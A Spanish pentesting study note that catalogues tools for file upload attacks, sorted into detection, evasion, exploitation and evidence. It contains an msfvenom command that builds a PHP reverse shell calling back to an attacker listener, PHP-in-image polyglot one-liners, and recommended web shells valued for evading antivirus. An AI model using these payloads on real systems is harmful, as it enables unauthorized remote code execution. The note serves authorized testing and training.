---
tags:
  - Web/Red-Team
  - Pentesting/Enumeracion
  - Pentesting/Explotacion
  - File-Upload
Fecha de actualización: 2026-06-21
Nota previa: "[[09 - Prevención de File Upload Attacks]]"
Nota siguiente: ""
Area: "[[File Upload.base|File Upload]]"
---
---

El resto del sub-tema enseña la vulnerabilidad a bajo nivel —imprescindible para reconocerla y exprimirla—. Esta nota es el complemento operativo: el set de herramientas que se usa hoy en un engagement real, organizado por las cuatro fases del trabajo (**detección, evasión, explotación, registro**). El estado de mantenimiento está verificado a junio de 2026, porque <mark style="background: #FFB8EBA6;">en este sub-tema abundan las herramientas abandonadas que la gente sigue recomendando</mark>.

# 1. Mapeo y detección

| Herramienta | Rol | Estado |
| - | - | - |
| **Burp Suite Pro** / **Caido** | Proxy, `Repeater`, `Intruder`. Núcleo del trabajo manual ([[02 - Interceptación de peticiones\|interceptar y replay]]) | Activo |
| **ffuf** | Fuzzing de extensiones, Content-Types y magic bytes | Activo |
| **nuclei** | Escaneo masivo de endpoints y CVEs de upload en bug bounty | Muy activo |
| **katana** + **gau** + **LinkFinder** | Descubrir endpoints de subida ocultos en el JavaScript (y `.js.map`) | Activos |
| **interactsh** / **Burp Collaborator** | Canal OOB para confirmar [[08 - Detección y metodología en entornos reales\|upload ciego]] | Activo |

```shell-session
$ ffuf -request upload.req -request-proto https -w web-extensions.txt:EXT -fr "not allowed" -mc 200
$ nuclei -l hosts.txt -tags file-upload,unrestricted-upload -severity high,critical
```

# 2. Scanners de upload dedicados

| Herramienta | Qué hace | Estado (jun-2026) |
| - | - | - |
| **[Upload Scanner](https://github.com/modzero/mod0BurpUploadScanner)** (modzero, Burp Pro) | Muta el upload con 25+ módulos: EXIF, SVG/TIFF/PDF XXE, ImageTragick, Ghostscript, polyglots; `ReDownloader` verifica supervivencia | <mark style="background: #FFB8EBA6;">Archivado abr-2024</mark>, funcional. El más completo para procesadores legacy |
| **[Upload_Bypass](https://github.com/sAjibuu/Upload_Bypass)** (sAjibuu) | Automatiza bypasses por módulos; 3 modos: detección, explotación (web shell UUID), anti-malware (EICAR) | <mark style="background: #ADCCFFA6;">Activo (v3.0.9-dev)</mark>. Prohibido en el OSCP |
| **[fuxploider](https://github.com/almandin/fuxploider)** | Enumera qué extensiones/MIME acepta el server | Abandonado (2018), aún útil para enumerar rápido |

```shell-session
$ python upload_bypass.py -r request.txt -s 'successfully uploaded' -E php -D /uploads \
    -i extension_shuffle,double_extension,svg_xxe --exploit --burp_http
```

> [!important]+ A mano primero, herramienta afinada después
> <mark style="background: #8000E1A6;">Detecta y confirma el contexto manualmente; lanza el scanner afinado al punto exacto.</mark> Igual que con [[01 - Detección de SQL Injection|SQLMap en SQLi]] o [[10 - Arsenal de herramientas para Command Injection|commix]], las herramientas automáticas fallan en contextos raros (JSON anidado, presigned URLs, second-order) y generan mucho ruido. Un scanner a ciegas contra todo dispara WAFs y *rate limits* y quema el objetivo.

# 3. Generación de payloads

**Web shells** (elige según el AV y el SO):

| Shell | Cuándo | Estado |
| - | - | - |
| **[weevely3](https://github.com/epinna/weevely3)** | PHP **ofuscado**, comunicación encubierta; evade firmas y trae 30+ módulos | Activo (v4.0.3) |
| **[p0wny-shell](https://github.com/flozz/p0wny-shell)** | PHP de un fichero, *fallbacks* de ejecución → funciona con `disable_functions` parcial | Activo |
| **[phpbash](https://github.com/Arrexel/phpbash)** | Terminal en navegador, requiere `shell_exec` | Funcional, **archivado** |
| **[Antak](https://github.com/samratashok/nishang)** (Nishang) | Web shell ASPX para IIS/.NET (ejecuta PowerShell) | Funcional (2017) |

**Reverse shells**: `msfvenom` y **[revshells.com](https://www.revshells.com/)** (generador interactivo, listo para pegar).

```shell-session
$ msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php
```

> [!warning]+ Gotcha de payload
> `php/meterpreter/reverse_tcp` empieza con `/*<?php` y algunos WAF lo bloquean por ese patrón; <mark style="background: #FFB86CA6;">`php/reverse_php` es más compacto y silencioso</mark>. Con `disable_functions` restrictivo, ni msfvenom ni el web shell clásico bastan: hay que escalar (p. ej. `chankro`).

**Metadatos e imagen**:

- **[exiftool](https://exiftool.org)**: inyecta PHP/XSS en metadatos de una imagen válida. No es solo un truco —`CVE-2021-22204` (RCE en ExifTool vía DjVu); su explotación en GitLab se rastreó como `CVE-2021-22205` y ganó [$19.000 en HackerOne](https://hackerone.com/reports/1154542)— porque el *pipeline* procesa el fichero por contenido, ignorando la extensión.
- **ImageMagick** (`convert`): PoC de `CVE-2022-44268` (lectura de ficheros vía chunk `tEXt`), payloads MVG de ImageTragick.
- **[oxml_xxe](https://github.com/BuffaloWill/oxml_xxe)**: inyecta XXE en DOCX/XLSX/PPTX/ODT. **[malicious-pdf](https://github.com/jonaslejon/malicious-pdf)**: 67 PDFs para OOB/SSRF/XXE.

**Polyglots**:

| Polyglot | Construcción | Nota |
| - | - | - |
| GIF89a+PHP | `echo 'GIF89a<?php ... ?>' > shell.php` | El más simple |
| JPEG+PHP (EXIF) | `exiftool -Comment='<?php ... ?>' real.jpg` | Portable (trigger = extensión) |
| PHAR+JPEG | `phpggc --phar-jpeg` | Vía `phar://` → deserialización |
| **PNG IDAT** | [PNG-IDAT-Payload-Generator](https://github.com/huntergregal/PNG-IDAT-Payload-Generator) | <mark style="background: #FF5582A6;">Único que sobrevive a un *resize* GD/ImageMagick</mark> |

# 4. Registro y evidencia

<mark style="background: #ADCCFFA6;">Una PoC reproducible vale más que el hallazgo</mark>:

- **interactsh** (`-o logs.txt -sf session.json`): sus logs DNS/HTTP son la **evidencia limpia** de un [[08 - Detección y metodología en entornos reales|upload ciego]] (SSRF/XXE/RCE OOB) para el informe.
- **Historial de Burp / Caido**: la petición de upload + respuesta con la ruta es la fuente de verdad del engagement.
- **Burp Collaborator**: captura la request completa que envió el server, no solo el callback.

# Flujo de referencia

```text
Mapear superficie (Burp/Caido + JS: katana/gau/LinkFinder, presigned S3)
   → Fuzz de extensión/Content-Type (ffuf + SecLists) · barrido (nuclei)
   → Huella del validador (mensaje de error) + oráculo OOB (interactsh) si es ciego
   → Payload acorde al contexto (web shell / polyglot / SVG / exploit de librería)
   → ¿WAF/AV? evasión (Upload_Bypass, weevely, EICAR de prueba)
   → Registrar (historial Burp/Caido + logs interactsh → informe)
```

> [!warning]+ OPSEC, rate limiting y recodificación
> Las herramientas automáticas son ruidosas: en un programa con WAF, un scanner a saco gana un baneo de IP. Empieza suave y respeta el *scope*. Y recuerda: <mark style="background: #FFB8EBA6;">si el server recodifica la imagen (Cloudflare Images, AWS `sharp`), los polyglots mueren</mark> salvo el del chunk IDAT —confirma primero si se sirve el fichero original.

> [!info]+ Fuentes y repos
> - [Upload_Bypass](https://github.com/sAjibuu/Upload_Bypass) · [Upload Scanner (modzero)](https://github.com/modzero/mod0BurpUploadScanner) · [fuxploider](https://github.com/almandin/fuxploider)
> - [weevely3](https://github.com/epinna/weevely3) · [p0wny-shell](https://github.com/flozz/p0wny-shell) · [revshells.com](https://www.revshells.com/)
> - [exiftool](https://exiftool.org) · [oxml_xxe](https://github.com/BuffaloWill/oxml_xxe) · [malicious-pdf](https://github.com/jonaslejon/malicious-pdf) · [PNG-IDAT generator](https://github.com/huntergregal/PNG-IDAT-Payload-Generator)
> - [PayloadsAllTheThings — Upload Insecure Files](https://swisskyrepo.github.io/PayloadsAllTheThings/Upload%20Insecure%20Files/) · [HackTricks — File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)

Con esto se cierra el sub-tema de File Upload: desde [[00 - Introducción a los File Upload Attacks|qué es]] y la [[01 - Explotación básica - web shells y reverse shells|explotación básica]], pasando por todo el bloque de [[03 - Bypass de blacklist de extensiones|bypass de filtros]] y los [[06 - Uploads limitados - SVG, polyglots y metadatos|vectores en uploads limitados]], hasta la [[08 - Detección y metodología en entornos reales|detección]], la [[09 - Prevención de File Upload Attacks|prevención]] y este arsenal operativo.
